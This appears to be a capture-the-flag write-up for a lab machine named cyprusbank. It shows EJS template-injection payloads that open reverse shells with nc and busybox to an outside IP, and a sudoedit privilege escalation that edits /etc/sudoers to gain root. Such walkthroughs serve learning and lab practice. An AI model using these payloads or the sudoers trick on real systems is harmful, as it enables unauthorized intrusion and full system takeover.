# Creating an error

<img width="1805" height="862" alt="image" src="https://github.com/user-attachments/assets/6ec7622d-a602-4aa9-9c05-4edb7fdfae00" />

# EJS SSTI exploitation

We found /home/web/app/views/settings.ejs
The file path /home/web/app/views/settings.ejs likely points to an EJS (Embedded JavaScript) template file used in a Node.js or Express.js web application.

# EJS SSTI RCE post

https://eslam.io/posts/ejs-server-side-template-injection-rce/?source=post_page-----972ee9129fe2---------------------------------------

# RCE payload
```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
```
# Command failed that's why use Busy box to get RCE

<img width="1595" height="622" alt="image" src="https://github.com/user-attachments/assets/9aa84854-c6fe-4e73-9842-25cc370f710a" />

# Busybox command

```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.4.73.176 1337 -e bash');s
```

# Changing the ip address to your IP and receive it back > get RCE

# Sudoedit privilege escalation
```
web@cyprusbank:~$ sudo -l

Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (ALL : ALL) NOPASSWD: ALL
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

# Steps by step

```
# export EDITOR="vim -- /etc/sudoers"
# sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

```

# In vim editor

```
Drags the way down AND write (web ALL=(ALL:ALL) NOPASSWD: ALL) and then save

<img width="1145" height="587" alt="image" src="https://github.com/user-attachments/assets/e57b99d5-c9b2-4e20-9bd8-7b9643e0b796" />

```

# Finally got ROOT access

```
# sudo bash
```
